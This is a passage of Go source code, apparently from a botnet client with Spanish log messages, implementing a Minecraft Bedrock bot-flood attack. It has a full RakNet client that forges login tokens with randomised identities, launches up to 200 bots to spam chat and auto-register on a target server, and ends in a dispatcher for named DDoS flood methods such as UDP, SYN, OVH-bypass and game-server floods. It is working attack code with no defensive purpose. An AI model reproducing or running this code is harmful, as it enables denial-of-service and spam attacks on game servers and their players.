	w := (&writer{}).u8(0x07).raw(magic)
	switch attempt % 6 {
	case 1:
		if err := w.stdIP(b.host, b.port); err != nil {
			return err
		}
	case 3:
		if err := w.rakIP(b.host, b.port); err != nil {
			return err
		}
		mtu = 1492
	case 4:
		if err := w.stdIP(b.host, b.port); err != nil {
			return err
		}
		mtu = 1492
	case 5:
		if err := w.rakIP(b.host, b.port); err != nil {
			return err
		}
		w.u16be(mtu).u64be(id).u64be(guid)
	default:
		if err := w.rakIP(b.host, b.port); err != nil {
			return err
		}
	}
	if attempt%6 != 5 {
		w.u16be(mtu).u64be(id)
	}
	packet := append([]byte(nil), w.buf()...)
	for i := 0; i < 3; i++ {
		if i > 0 {
			time.Sleep(50 * time.Millisecond)
		}
		if err := b.rawSend(packet); err != nil {
			return err
		}
	}
	return nil
}

func (b *MCBot) frame(payload []byte, split bool, count, splitID, index uint32) error {
	b.mu.Lock()
	if b.closing {
		b.mu.Unlock()
		return context.Canceled
	}
	seq := b.sendSeq
	b.sendSeq++
	msg, order := b.msgIndex, b.orderIndex
	b.msgIndex++
	b.orderIndex++
	w := (&writer{}).u8(0x84).u24le(seq)
	if split {
		w.u8(0x70)
	} else {
		w.u8(0x60)
	}
	w.u16be(len(payload) * 8).u24le(msg).u24le(order).u8(0)
	if split {
		w.u32be(count).u16be(int(splitID)).u32be(index)
	}
	packet := append([]byte(nil), w.raw(payload).buf()...)
	b.frames[seq] = packet
	if len(b.frames) > 1024 {
		var oldest uint32
		first := true
		for n := range b.frames {
			if first || n < oldest {
				oldest, first = n, false
			}
		}
		delete(b.frames, oldest)
	}
	b.mu.Unlock()
	return b.rawSend(packet)
}

func zlibBytes(data []byte) ([]byte, error) {
	var out bytes.Buffer
	zw, err := zlib.NewWriterLevel(&out, 7)
	if err != nil {
		return nil, err
	}
	if _, err := zw.Write(data); err != nil {
		_ = zw.Close()
		return nil, err
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	return out.Bytes(), nil
}

func buildBatch(packets [][]byte) ([]byte, error) {
	var inner bytes.Buffer
	for _, packet := range packets {
		if err := binary.Write(&inner, binary.BigEndian, uint32(len(packet))); err != nil {
			return nil, err
		}
		_, _ = inner.Write(packet)
	}
	comp, err := zlibBytes(inner.Bytes())
	if err != nil {
		return nil, err
	}
	return comp, nil
}

func (b *MCBot) sendReliable(payload []byte) error {
	b.mu.Lock()
	maxPayload := b.mtuSize - 60
	b.mu.Unlock()
	if maxPayload <= 0 {
		maxPayload = 1404
	}
	if len(payload) <= maxPayload {
		return b.frame(payload, false, 0, 0, 0)
	}
	b.mu.Lock()
	sid := uint32(uint16(b.splitID))
	b.splitID++
	b.mu.Unlock()
	count := uint32((len(payload) + maxPayload - 1) / maxPayload)
	for i := uint32(0); i < count; i++ {
		start, end := int(i)*maxPayload, int(i+1)*maxPayload
		if end > len(payload) {
			end = len(payload)
		}
		if err := b.frame(payload[start:end], true, count, sid, i); err != nil {
			return err
		}
	}
	return nil
}

func (b *MCBot) sendGame(packet []byte) error {
	b.mu.Lock()
	proto := b.proto
	b.mu.Unlock()
	comp, err := buildBatch([][]byte{packet})
	if err != nil {
		return err
	}
	var batch []byte
	if proto >= 84 {
		batch = (&writer{}).u8(0xfe).u8(0x06).i32be(int32(len(comp))).raw(comp).buf()
	} else {
		batch = (&writer{}).u8(0x92).i32be(int32(len(comp))).raw(comp).buf()
	}
	return b.sendReliable(batch)
}

func (b *MCBot) ids() (move, text, chunk byte) {
	b.mu.Lock()
	proto, variant := b.proto, b.useVariantA
	b.mu.Unlock()
	if proto < 84 {
		return 0x9d, 0x93, 0xc9
	}
	if variant {
		return 0x10, 0x07, 0x3d
	}
	return 0x13, 0x09, 0x45
}

func (b *MCBot) chunkRadius() []byte {
	_, _, chunk := b.ids()
	radius, _ := rand.Int(rand.Reader, big.NewInt(8))
	if chunk == 0x3d || chunk == 0x45 {
		return (&writer{}).u8(chunk).varint(uint32(radius.Int64() + 4)).buf()
	}
	return (&writer{}).u8(chunk).i32be(int32(radius.Int64() + 4)).buf()
}

func (b *MCBot) movePacket() []byte {
	move, _, _ := b.ids()
	b.mu.Lock()
	id, p, proto, variant := b.entityID, b.pos, b.proto, b.useVariantA
	b.mu.Unlock()
	if proto >= 84 {
		move = 0x13
		if variant {
			move = 0x10
		}
		return (&writer{}).u8(move).i64be(id).
			f32be(p.x).f32be(p.y).f32be(p.z).
			f32be(p.yaw).f32be(p.headYaw).f32be(p.pitch).
			u8(boolByte(p.onGround)).u8(1).buf()
	}
	return (&writer{}).u8(move).i64be(id).
		f32be(p.x).f32be(p.y + 1.62).f32be(p.z).
		f32be(p.yaw).f32be(p.headYaw).f32be(p.pitch).
		u8(0).u8(boolByte(p.onGround)).buf()
}

func boolByte(v bool) byte {
	if v {
		return 1
	}
	return 0
}

func (b *MCBot) chatPacket(message string) []byte {
	_, text, _ := b.ids()
	b.mu.Lock()
	name := b.name
	b.mu.Unlock()
	return (&writer{}).u8(text).u8(1).str(name).str(message).buf()
}

func (b *MCBot) login84() ([]byte, error) {
	b.mu.Lock()
	name, host, port, id := b.name, b.host, b.port, b.clientID
	b.mu.Unlock()
	rawIdentity := make([]byte, 16)
	if _, err := rand.Read(rawIdentity); err != nil {
		return nil, err
	}
	rawIdentity[6] = (rawIdentity[6] & 0x0f) | 0x40
	rawIdentity[8] = (rawIdentity[8] & 0x3f) | 0x80
	identityHex := hex.EncodeToString(rawIdentity)
	identity := identityHex[0:8] + "-" + identityHex[8:12] + "-" +
		identityHex[12:16] + "-" + identityHex[16:20] + "-" + identityHex[20:32]
	pubDER, err := x509.MarshalPKIXPublicKey(&b.key.PublicKey)
	if err != nil {
		return nil, err
	}
	pub := base64.StdEncoding.EncodeToString(pubDER)
	now := time.Now().Unix()
	chain, err := makeJWT(b.key, map[string]any{
		"extraData":         map[string]string{"displayName": name, "identity": identity, "XUID": randomXUID()},
		"identityPublicKey": pub,
		"nbf":               now - 60,
		"exp":               now + 86400,
	})
	if err != nil {
		return nil, err
	}
	skin := generateSteveSkin()
	deviceOS := []int{1, 2, 7, 11}[mathrand.Intn(4)]
	gameVersion := []string{"0.15.10", "0.16.0", "0.16.1", "0.16.2"}[mathrand.Intn(4)]
	deviceModel := []string{"SM-G950F", "iPhone8,1", "iPhone9,2", "Windows 10", "Linux x64"}[mathrand.Intn(5)]
	language := []string{"en_US", "es_ES", "pt_BR"}[mathrand.Intn(3)]
	skinJWT, err := makeJWT(b.key, map[string]any{
		"ClientRandomId":   id & 0xffffffff,
		"ServerAddress":    net.JoinHostPort(host, strconv.Itoa(port)),
		"SkinData":         skin,
		"SkinId":           "Standard_Custom",
		"CapeData":         "",
		"SkinGeometryName": "geometry.humanoid.custom",
		"SkinGeometry":     "",
		"DeviceOS":         deviceOS,
		"DeviceModel":      deviceModel,
		"GameVersion":      gameVersion,
		"CurrentInputMode": 1 + mathrand.Intn(2),
		"DefaultInputMode": 1 + mathrand.Intn(2),
		"UIProfile":        mathrand.Intn(2),
		"GuiScale":         mathrand.Intn(3),
		"LanguageCode":     language,
	})
	if err != nil {
		return nil, err
	}
	chainJSON, _ := json.Marshal(map[string]any{"chain": []string{chain}})
	skinBytes := []byte(skinJWT)
	raw := (&writer{}).i32le(int32(len(chainJSON))).raw(chainJSON).i32le(int32(len(skinBytes))).raw(skinBytes).buf()
	comp, err := zlibBytes(raw)
	if err != nil {
		return nil, err
	}
	return (&writer{}).u8(0xfe).u8(0x01).i32be(84).i32be(int32(len(comp))).raw(comp).buf(), nil
}

func (b *MCBot) handleServerHandshake(payload []byte) error {
	r := &reader{b: payload}
	if err := r.skip(1); err != nil {
		return err
	}
	var ping int64
	if v, err := r.u8(); err == nil {
		if v == 4 {
			err = r.skip(6)
		} else {
			err = r.skip(18)
		}
		if err == nil {
			_ = r.skip(2)
			for i := 0; i < 10; i++ {
				x, e := r.u8()
				if e != nil {
					break
				}
				if x == 4 {
					_ = r.skip(6)
				} else {
					_ = r.skip(18)
				}
			}
			ping, _ = r.i64be()
		}
	}
	w := (&writer{}).u8(0x13)
	if err := w.rakIP(b.host, b.port); err != nil {
		return err
	}
	for i := 0; i < 10; i++ {
		w.u8(4).u8(0x80).u8(0xff).u8(0xff).u8(0xfe).u16be(0)
	}
	if err := b.frame(w.i64be(ping).i64be(time.Now().UnixMilli()).buf(), false, 0, 0, 0); err != nil {
		return err
	}
	b.mu.Lock()
	scheduleLogin := b.phase == "HANDSHAKING" && !b.loginScheduled
	if scheduleLogin {
		b.loginScheduled = true
	}
	b.mu.Unlock()
	if scheduleLogin {
		go func() {
			timer := time.NewTimer(time.Duration(100+mathrand.Intn(701)) * time.Millisecond)
			defer timer.Stop()
			select {
			case <-b.ctx.Done():
				return
			case <-timer.C:
				b.beginLogin()
			}
		}()
	}
	return nil
}

func (b *MCBot) onPlayStatus(status int32) error {
	fmt.Printf("[MCBot] %s PLAY_STATUS=%d\n", b.name, status)
	if status == 0 {
		return b.sendGame(b.chunkRadius())
	}
	if status == 1 || status == 2 {
		fmt.Printf("[MCBot] %s rechazado por el servidor (status=%d)\n", b.name, status)
		b.close()
		return nil
	}
	if status == 3 {
		b.mu.Lock()
		if b.spawned {
			b.mu.Unlock()
			return nil
		}
		b.spawned = true
		b.mu.Unlock()
		_ = b.sendGame(b.chunkRadius())
		b.startLoops()
		fmt.Printf("[MCBot] %s entró al mundo\n", b.name)
	}
	return nil
}

func (b *MCBot) handleMCPE(packet []byte) error {
	if len(packet) == 0 {
		return nil
	}
	pid := packet[0]
	r := &reader{b: packet[1:]}
	switch pid {
	case 0x90, 0x02:
		status, err := r.i32be()
		if err != nil {
			return err
		}
		return b.onPlayStatus(status)
	case 0x06:
		b.mu.Lock()
		respond := b.proto >= 84 && !b.resourcePackDone && !b.useVariantA
		b.mu.Unlock()
		if respond {
			_ = b.sendGame((&writer{}).u8(0x08).u8(3).u16be(0).buf())
		}
	case 0x07:
		b.mu.Lock()
		respond := b.proto >= 84 && !b.resourcePackDone && !b.useVariantA
		b.resourcePackDone = true
		b.mu.Unlock()
		if respond {
			_ = b.sendGame((&writer{}).u8(0x08).u8(4).u16be(0).buf())
		}
	case 0x03:
		b.mu.Lock()
		proto := b.proto
		b.mu.Unlock()
		if proto >= 84 {
			_ = b.sendGame([]byte{0x04})
			_ = b.sendGame(b.chunkRadius())
		}
	case 0x95, 0x09, 0x0b, 0x11:
		b.mu.Lock()
		if b.proto >= 84 {
			b.useVariantA = pid == 0x09
		}
		b.mu.Unlock()
		_, _ = r.i32be()
		_, _ = r.u8()
		_, _ = r.i32be()
		_, _ = r.i32be()
		entity, err := r.i64be()
		if err == nil {
			_, _ = r.i32be()
			_, _ = r.i32be()
			_, _ = r.i32be()
			x, e1 := r.f32be()
			y, e2 := r.f32be()
			z, e3 := r.f32be()
			if e1 == nil && e2 == nil && e3 == nil {
				b.mu.Lock()
				b.entityID, b.pos.x, b.pos.y, b.pos.z = entity, x, y, z
				b.mu.Unlock()
			}
		}
		_ = b.sendGame(b.chunkRadius())
		b.mu.Lock()
		startFallback := !b.spawnFallback
		b.spawnFallback = true
		b.mu.Unlock()
		if startFallback {
			go func() {
				timer := time.NewTimer(10 * time.Second)
				defer timer.Stop()
				select {
				case <-b.ctx.Done():
					return
				case <-timer.C:
					b.mu.Lock()
					needsSpawn := !b.spawned && !b.closing
					b.mu.Unlock()
					if needsSpawn {
						_ = b.onPlayStatus(3)
					}
				}
			}()
		}
	case 0x91, 0x05:
		fmt.Printf("[MCBot] %s desconectado por el servidor\n", b.name)
		b.close()
	}
	return nil
}

func (b *MCBot) innerPacket(payload []byte) error {
	if len(payload) == 0 {
		return nil
	}
	switch payload[0] {
	case 0x00:
		if len(payload) >= 9 {
			ts := int64(binary.BigEndian.Uint64(payload[1:9]))
			return b.frame((&writer{}).u8(0x03).i64be(ts).i64be(time.Now().UnixMilli()).buf(), false, 0, 0, 0)
		}
	case 0x15:
		b.close()
	case 0x10:
		fmt.Printf("[MCBot] %s recibió NewIncomingConnection\n", b.name)
		return b.handleServerHandshake(payload)
	case 0xfe:
		if len(payload) < 2 {
			return nil
		}
		if payload[1] == 0x06 {
			return b.handleBatch(payload[2:])
		}
		return b.handleMCPE(payload[1:])
	case 0x92:
		return b.handleBatch(payload[1:])
	case 0x06:
		b.mu.Lock()
		isBatch := b.proto >= 84
		b.mu.Unlock()
		if isBatch {
			return b.handleBatch(payload[1:])
		}
	}
	return b.handleMCPE(payload)
}

func (b *MCBot) handleBatch(payload []byte) error {
	r := &reader{b: payload}
	n, err := r.i32be()
	if err != nil || n < 0 || int(n) > r.left() {
		return errors.New("batch MCPE inválido")
	}
	comp, _ := r.take(int(n))
	var source io.Reader
	zr, err := zlib.NewReader(bytes.NewReader(comp))
	if err == nil {
		source = zr
	} else {
		source = flate.NewReader(bytes.NewReader(comp))
	}
	inner, readErr := io.ReadAll(source)
	if zr != nil {
		_ = zr.Close()
	}
	if closer, ok := source.(io.ReadCloser); ok && zr == nil {
		_ = closer.Close()
	}
	err = readErr
	if err != nil {
		return err
	}
	ir := &reader{b: inner}
	for ir.left() >= 4 {
		length, err := ir.u32be()
		if err != nil || length == 0 || uint64(length) > uint64(ir.left()) {
			break
		}
		packet, _ := ir.take(int(length))
		if len(packet) > 1 && packet[0] == 0xfe {
			_ = b.innerPacket(packet[1:])
		} else {
			_ = b.innerPacket(packet)
		}
	}
	return nil
}

func (b *MCBot) parseData(packet []byte) error {
	if len(packet) < 4 {
		return io.ErrUnexpectedEOF
	}
	r := &reader{b: packet}
	_ = r.skip(1)
	seq, err := r.tLE()
	if err != nil {
		return err
	}
	b.mu.Lock()
	b.ackQueue = append(b.ackQueue, seq)
	b.mu.Unlock()
	for r.left() > 0 {
		flags, err := r.u8()
		if err != nil {
			break
		}
		reliability, split := (flags>>5)&7, (flags>>4)&1
		bits, err := r.u16be()
		if err != nil {
			break
		}
		length := (int(bits) + 7) / 8
		if reliability == 2 || reliability == 3 || reliability == 4 || reliability == 6 || reliability == 7 {
			_ = r.skip(3)
		}
		if reliability == 1 || reliability == 3 || reliability == 4 {
			_ = r.skip(3)
			_ = r.skip(1)
		}
		var count uint32
		var id uint16
		var index uint32
		if split == 1 {
			count, err = r.u32be()
			if err != nil {
				break
			}
			rawID, e := r.u16be()
			if e != nil {
				break
			}
			id = rawID
			index, err = r.u32be()
			if err != nil || count == 0 || count > 4096 {
				break
			}
		}
		body, err := r.take(length)
		if err != nil {
			break
		}
		if split == 1 {
			b.mu.Lock()
			assembly := b.splits[id]
			if assembly == nil {
				assembly = &splitPacket{count: count, parts: make(map[uint32][]byte)}
				b.splits[id] = assembly
			}
			if index < assembly.count {
				assembly.parts[index] = append([]byte(nil), body...)
			}
			complete := len(assembly.parts) == int(assembly.count)
			var combined []byte
			if complete {
				for i := uint32(0); i < assembly.count; i++ {
					combined = append(combined, assembly.parts[i]...)
				}
				delete(b.splits, id)
			}
			b.mu.Unlock()
			if complete {
				_ = b.innerPacket(combined)
			}
		} else {
			_ = b.innerPacket(body)
		}
	}
	return nil
}

func (b *MCBot) sendACKs() {
	b.mu.Lock()
	if len(b.ackQueue) == 0 || b.closing {
		b.mu.Unlock()
		return
	}
	seen := make(map[uint32]bool)
	values := make([]uint32, 0, len(b.ackQueue))
	for _, n := range b.ackQueue {
		if !seen[n] {
			seen[n] = true
			values = append(values, n)
		}
	}
	b.ackQueue = nil
	b.mu.Unlock()
	sortUint32(values)
	type span struct{ start, end uint32 }
	spans := make([]span, 0)
	for _, n := range values {
		if len(spans) == 0 || n > spans[len(spans)-1].end+1 {
			spans = append(spans, span{n, n})
		} else if n == spans[len(spans)-1].end+1 {
			spans[len(spans)-1].end = n
		}
	}
	w := (&writer{}).u8(0xc0).u16be(len(spans))
	for _, s := range spans {
		if s.start == s.end {
			w.u8(1).u24le(s.start)
		} else {
			w.u8(0).u24le(s.start).u24le(s.end)
		}
	}
	_ = b.rawSend(w.buf())
}

func sortUint32(values []uint32) {
	for i := 1; i < len(values); i++ {
		for j := i; j > 0 && values[j] < values[j-1]; j-- {
			values[j], values[j-1] = values[j-1], values[j]
		}
	}
}

func (b *MCBot) handleNACK(packet []byte) {
	r := &reader{b: packet}
	_ = r.skip(1)
	count, err := r.u16be()
	if err != nil {
		return
	}
	for i := 0; i < int(count); i++ {
		single, err := r.u8()
		if err != nil {
			return
		}
		start, err := r.tLE()
		if err != nil {
			return
		}
		end := start
		if single == 0 {
			end, err = r.tLE()
			if err != nil {
				return
			}
		}
		for seq := start; seq <= end; seq++ {
			b.mu.Lock()
			frame := append([]byte(nil), b.frames[seq]...)
			b.mu.Unlock()
			if len(frame) > 0 {
				_ = b.rawSend(frame)
			}
			if seq == 0xffffff {
				break
			}
		}
	}
}

func (b *MCBot) handlePacket(packet []byte) {
	if len(packet) == 0 {
		return
	}
	switch packet[0] {
	case 0xc0:
		return
	case 0xa0:
		b.handleNACK(packet)
	case 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f:
		_ = b.parseData(packet)
		b.sendACKs()
	case 0x06:
		b.mu.Lock()
		connecting := b.phase == "CONNECTING_1"
		if len(packet) >= 2 {
			mtu := int(binary.BigEndian.Uint16(packet[len(packet)-2:]))
			if mtu >= 576 && mtu <= 1500 {
				b.mtuSize = mtu
			}
		}
		if len(packet) >= 25 {
			b.serverGUID = binary.BigEndian.Uint64(packet[17:25])
		}
		if connecting {
			b.phase = "CONNECTING_2"
			b.request2Attempt = 0
		}
		b.mu.Unlock()
		if connecting {
			fmt.Printf("[MCBot] %s Reply1 OK: MTU=%d GUID=%d\n", b.name, b.mtuSize, b.serverGUID)
			_ = b.request2(0)
		}
	case 0x08:
		b.mu.Lock()
		ready := b.phase == "CONNECTING_2"
		if len(packet) >= 2 {
			mtu := int(binary.BigEndian.Uint16(packet[len(packet)-2:]))
			if mtu >= 400 && mtu <= 1500 {
				b.mtuSize = mtu
			}
		}
		if ready {
			b.phase = "HANDSHAKING"
			b.connectionRequestAttempts = 0
			b.lastConnectionRequest = time.Time{}
		}
		b.mu.Unlock()
		if ready {
			fmt.Printf("[MCBot] %s Reply2 OK: MTU=%d; enviando Connection Request\n", b.name, b.mtuSize)
			_ = b.sendConnectionRequest()
		}
	case 0x1c:
		b.handlePong(packet)
	}
}

func (b *MCBot) handlePong(packet []byte) {
	b.mu.Lock()
	known := b.phase == "UNCONNECTED"
	b.mu.Unlock()
	if !known {
		return
	}
	r := &reader{b: packet}
	proto := b.proto
	if err := r.skip(1 + 8 + 8 + 16); err == nil {
		motd, err := r.str()
		if err == nil {
			parts := strings.Split(motd, ";")
			if len(parts) >= 3 {
				if p, err := strconv.Atoi(parts[2]); err == nil && p > 0 {
					proto = p
				}
			}
		}
	}
	b.mu.Lock()
	b.proto = proto
	b.phase = "CONNECTING_1"
	b.mu.Unlock()
	fmt.Printf("[MCBot] %s PONG recibido: protocolo=%d; enviando OpenConnectionRequest1\n", b.name, proto)
	_ = b.request1()
}

func (b *MCBot) beginLogin() {
	b.mu.Lock()
	if b.phase != "HANDSHAKING" || b.closing {
		b.mu.Unlock()
		return
	}
	b.phase = "LOGIN"
	proto := b.proto
	b.mu.Unlock()
	var packet []byte
	var err error
	if proto >= 84 {
		packet, err = b.login84()
	} else {
		return
	}
	if err == nil {
		fmt.Printf("[MCBot] %s enviando Login proto=%d (%d bytes)\n", b.name, proto, len(packet))
		_ = b.sendReliable(packet)
	} else {
		fmt.Printf("[MCBot] %s error generando Login: %v\n", b.name, err)
	}
}

func (b *MCBot) sendConnectionRequest() error {
	b.mu.Lock()
	if b.phase != "HANDSHAKING" || b.closing {
		b.mu.Unlock()
		return nil
	}
	id := b.clientID
	b.lastConnectionRequest = time.Now()
	b.connectionRequestAttempts++
	attempt := b.connectionRequestAttempts
	b.mu.Unlock()
	fmt.Printf("[MCBot] %s Connection Request intento %d\n", b.name, attempt)
	return b.frame((&writer{}).u8(0x09).u64be(id).i64be(time.Now().UnixMilli()).u8(0).buf(), false, 0, 0, 0)
}

func (b *MCBot) startLoops() {
	b.mu.Lock()
	if b.loopsStarted {
		b.mu.Unlock()
		return
	}
	b.loopsStarted = true
	b.mu.Unlock()

	// Movimiento - IGUAL QUE MCBOT.GO
	go func() {
		ticker := time.NewTicker(1800 * time.Millisecond)
		defer ticker.Stop()
		direction := mathrand.Float64() * math.Pi * 2
		var originX, originZ float32
		b.mu.Lock()
		originX, originZ = b.pos.x, b.pos.z
		b.mu.Unlock()
		for {
			select {
			case <-b.ctx.Done():
				return
			case <-b.stopChan:
				b.close()
				return
			case <-ticker.C:
				b.mu.Lock()
				if !b.spawned || b.closing {
					b.mu.Unlock()
					return
				}
				if mathrand.Float64() < 0.15 {
					direction += (mathrand.Float64() - 0.5) * 0.7
				}
				speed := float32(0.2 + mathrand.Float64()*0.5)
				b.pos.x += float32(math.Cos(direction)) * speed
				b.pos.z += float32(math.Sin(direction)) * speed
				dx, dz := b.pos.x-originX, b.pos.z-originZ
				if dx*dx+dz*dz > 144 {
					direction = math.Atan2(float64(originZ-b.pos.z), float64(originX-b.pos.x))
				}
				b.pos.yaw = float32(math.Mod(direction*180/math.Pi+90+360, 360))
				b.pos.headYaw = b.pos.yaw + float32((mathrand.Float64()-0.5)*45)
				b.pos.pitch = float32((mathrand.Float64() - 0.5) * 15)
				b.pos.onGround = true
				b.mu.Unlock()
				_ = b.sendGame(b.movePacket())
			}
		}
	}()

	// ENVIAR REGISTRO - IGUAL QUE MCBOT.GO
	if b.registerProvided && b.register != "" {
		b.mu.Lock()
		shouldSend := !b.registerSent
		if shouldSend {
			b.registerSent = true
		}
		b.mu.Unlock()
		if shouldSend {
			command := b.register
			if strings.HasPrefix(command, "/") {
				command += " " + randomPass()
			} else if command == "" {
				command = randomPass()
			}
			fmt.Printf("[MCBot] %s enviando registro: %s\n", b.name, command)
			_ = b.sendGame(b.chatPacket(command))
		}
	}

	// SPAM DE MENSAJES - IGUAL QUE MCBOT.GO
	if b.interval > 0 && len(b.messages) > 0 {
		go func() {
			ticker := time.NewTicker(b.interval)
			defer ticker.Stop()
			index := 0
			for {
				select {
				case <-b.ctx.Done():
					return
				case <-b.stopChan:
					b.close()
					return
				case <-ticker.C:
					b.mu.Lock()
					active := b.spawned && !b.closing
					b.mu.Unlock()
					if !active {
						return
					}
					msg := b.messages[index%len(b.messages)]
					fmt.Printf("[MCBot] %s enviando mensaje: %s\n", b.name, msg)
					_ = b.sendGame(b.chatPacket(msg))
					index++
				}
			}
		}()
	}
}

func (b *MCBot) close() {
	b.mu.Lock()
	if b.closing {
		b.mu.Unlock()
		return
	}
	b.closing = true
	b.spawned = false
	b.mu.Unlock()
	b.cancel()
	_ = b.conn.Close()
}

func (b *MCBot) Run() error {
	defer b.close()
	fmt.Printf("[MCBot] Conectando a %s:%d como %s\n", b.host, b.port, b.name)
	if err := b.initialPing(); err != nil {
		return err
	}
	buffer := make([]byte, 65535)
	for {
		select {
		case <-b.ctx.Done():
			return nil
		case <-b.stopChan:
			fmt.Printf("[MCBot] %s recibió señal de stop\n", b.name)
			b.close()
			return nil
		default:
		}
		_ = b.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, _, err := b.conn.ReadFromUDP(buffer)
		if err == nil && n > 0 {
			b.handlePacket(append([]byte(nil), buffer[:n]...))
		} else if ne, ok := err.(net.Error); !ok || !ne.Timeout() {
			if b.ctx.Err() != nil {
				return nil
			}
			return err
		}
		b.maintenance()
	}
}

func (b *MCBot) maintenance() {
	b.mu.Lock()
	phase, lastPing, pings, mtuRetry, request2, attempt := b.phase, b.lastPing, b.pingCount, b.lastMTURetry, b.lastRequest2, b.request2Attempt
	b.mu.Unlock()
	now := time.Now()
	switch phase {
	case "UNCONNECTED":
		if now.Sub(lastPing) >= 500*time.Millisecond {
			if pings >= 3 {
				b.mu.Lock()
				b.proto, b.phase, b.pingCount = 84, "CONNECTING_1", pings
				b.mu.Unlock()
				_ = b.request1()
			} else {
				b.mu.Lock()
				b.pingCount++
				b.lastPing = now
				b.mu.Unlock()
				_ = b.initialPing()
			}
		}
	case "CONNECTING_1":
		if now.Sub(mtuRetry) >= 3*time.Second {
			b.mu.Lock()
			b.mtuIndex = (b.mtuIndex + 1) % len(mtus)
			b.mu.Unlock()
			_ = b.request1()
		}
	case "CONNECTING_2":
		delay := 500 * time.Millisecond
		for i := 0; i < attempt/3; i++ {
			delay = time.Duration(float64(delay) * 1.3)
			if delay >= 4*time.Second {
				delay = 4 * time.Second
				break
			}
		}
		if now.Sub(request2) >= delay {
			if attempt > 30 {
				fmt.Printf("[MCBot] Request2 agotado; reiniciando handshake\n")
				b.mu.Lock()
				b.phase, b.proto, b.pingCount = "UNCONNECTED", 84, 0
				b.lastPing = time.Time{}
				b.mu.Unlock()
				_ = b.initialPing()
			} else {
				_ = b.request2(attempt)
			}
		}
	case "HANDSHAKING":
		b.mu.Lock()
		lastRequest, attempts, scheduled := b.lastConnectionRequest, b.connectionRequestAttempts, b.loginScheduled
		b.mu.Unlock()
		if !scheduled && attempts < 4 && now.Sub(lastRequest) >= 2*time.Second {
			_ = b.sendConnectionRequest()
		}
	}
}

// ─── START MCBOT ATTACK ──────────────────────────────────────────────────
func startMCBotAttack(host string, port int, nombre string, cantidad int, tiempo int, registerCmd string, mensajesRaw string, intervalo int) {
	mcbotStopMu.Lock()
	if mcbotCancel != nil {
		mcbotCancel()
	}
	mcbotCtx, mcbotCancel = context.WithCancel(context.Background())
	mcbotStop = make(chan bool)
	mcbotRunning = true
	mcbotStopMu.Unlock()

	messages := []string{}
	if mensajesRaw != "" {
		for _, msg := range strings.Split(mensajesRaw, "|") {
			msg = strings.TrimSpace(strings.ReplaceAll(msg, "-", " "))
			if msg != "" {
				messages = append(messages, msg)
			}
		}
	}
	if len(messages) == 0 {
		messages = []string{"Hola!"}
	}

	interval := time.Duration(intervalo) * time.Second
	registerProvided := registerCmd != "" && registerCmd != "0" && registerCmd != "null"

	if registerCmd == "0" || registerCmd == "" {
		registerCmd = ""
		registerProvided = false
	}

	fmt.Printf("[MCBot] Iniciando ataque a %s:%d\n", host, port)
	fmt.Printf("[MCBot] Bots: %d, Tiempo: %ds, Nombre: %s\n", cantidad, tiempo, nombre)
	fmt.Printf("[MCBot] Register provided: %v, cmd: '%s'\n", registerProvided, registerCmd)
	fmt.Printf("[MCBot] Mensajes: %v, Intervalo: %ds\n", messages, intervalo)

	if cantidad > 200 {
		cantidad = 200
		fmt.Printf("[MCBot] Limitado a 200 bots (máximo permitido)\n")
	}

	var wg sync.WaitGroup
	stopChan := mcbotStop

	for i := 0; i < cantidad; i++ {
		select {
		case <-stopChan:
			fmt.Printf("[MCBot] Detenido por stop\n")
			mcbotStopMu.Lock()
			mcbotRunning = false
			mcbotStopMu.Unlock()
			return
		default:
		}

		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			ctxBot, cancelBot := context.WithCancel(mcbotCtx)
			defer cancelBot()

			bot, err := newMCBot(ctxBot, host, port, nombre, registerCmd, registerProvided, messages, interval, stopChan)
			if err != nil {
				fmt.Printf("[MCBot] Error creando bot %d: %v\n", id, err)
				return
			}

			mcbotMu.Lock()
			mcbotBots = append(mcbotBots, bot)
			mcbotMu.Unlock()

			_ = bot.Run()

			mcbotMu.Lock()
			for i, b := range mcbotBots {
				if b == bot {
					mcbotBots = append(mcbotBots[:i], mcbotBots[i+1:]...)
					break
				}
			}
			mcbotMu.Unlock()
		}(i)

		if i%10 == 0 {
			time.Sleep(100 * time.Millisecond)
		}
	}

	if tiempo > 0 {
		time.Sleep(time.Duration(tiempo) * time.Second)
		stopMCBot()
	}

	wg.Wait()
	fmt.Printf("[MCBot] Ataque finalizado\n")
	mcbotStopMu.Lock()
	mcbotRunning = false
	mcbotStopMu.Unlock()
}

func stopMCBot() {
	mcbotStopMu.Lock()
	defer mcbotStopMu.Unlock()

	if mcbotCancel != nil {
		mcbotCancel()
	}

	if mcbotStop != nil {
		select {
		case <-mcbotStop:
		default:
			close(mcbotStop)
		}
	}

	mcbotMu.Lock()
	for _, bot := range mcbotBots {
		if bot != nil {
			bot.close()
		}
	}
	mcbotBots = []*MCBot{}
	mcbotMu.Unlock()

	mcbotRunning = false
	fmt.Println("[MCBot] Detenido completamente")
}

// ═════════════════════════════════════════════════════════════════════════════
// ─── FUNCIONES PRINCIPALES ──────────────────────────────────────────────────
// ═════════════════════════════════════════════════════════════════════════════

func lunchAttack(method string, ip string, port int, secs int, stopChan <-chan bool) {
	switch method {
	case ".UDP":
		attackUDP(ip, port, secs, stopChan)
	case ".UDPBYPASS":
		attackUDP(ip, port, secs, stopChan)
	case ".UDPFRAG":
		attackUDPFrag(ip, port, secs, stopChan)
	case ".UDPGAME":
		attackUDPGame(ip, port, secs, stopChan)
	case ".UDPKILL":
		attackUDPKill(ip, port, secs, stopChan)
	case ".UDPPPS":
		attackUDPPPS(ip, port, secs, stopChan)
	case ".UDPQUERY":
		attackUDPQuery(ip, port, secs, stopChan)
	case ".TCP":
		attackTCP(ip, port, secs, stopChan)
	case ".TCPOVH":
		attackTCPOVH(ip, port, secs, stopChan)
	case ".SYN":
		attackSYN(ip, port, secs, stopChan)
	case ".MIX":
		attackMIX(ip, port, secs, stopChan)
	case ".OVHUDP":
		attackOVHUDP(ip, port, secs, stopChan)
	case ".OVHTCP":
		attackTCPOVH(ip, port, secs, stopChan)
	case ".OVHPPS":
		attackOVHPPS(ip, port, secs, stopChan)
	case ".HEX":
		attackHEX(ip, port, secs, stopChan)
	case ".VSE":
		attackVSE(ip, port, secs, stopChan)
	case ".MCPE":
		attackMCPE(ip, port, secs, stopChan)
	case ".FIVEM":
